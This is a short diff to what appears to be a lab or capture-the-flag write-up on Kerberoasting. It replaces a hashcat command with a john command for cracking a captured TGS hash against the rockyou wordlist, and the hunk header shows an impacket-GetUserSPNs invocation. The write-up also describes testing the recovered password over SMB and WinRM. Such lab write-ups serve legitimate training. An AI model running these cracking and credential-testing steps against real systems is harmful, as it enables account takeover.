@@ -144,10 +144,10 @@ faketime "$(ntpdate -q 10.129.232.167 | cut -d' ' -f1,2)" impacket-GetUserSPNs -
 With the hash captured, we can move to cracking it. 
 
 ```
-hashcat -m 13100 alfred_tgs /usr/share/wordlists/rockyou.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt alfred_tgs
 ```
 
-![](../../1_2eHx0OshM5oZi2H_TAyUdw.webp)
+![](Assets/2026-08-09_20-15.png)
 
 Once cracked, I tested the recovered password against SMB and WinRM to check its validity. As we can see, these credentials work for SMB but not for WinRM.
 
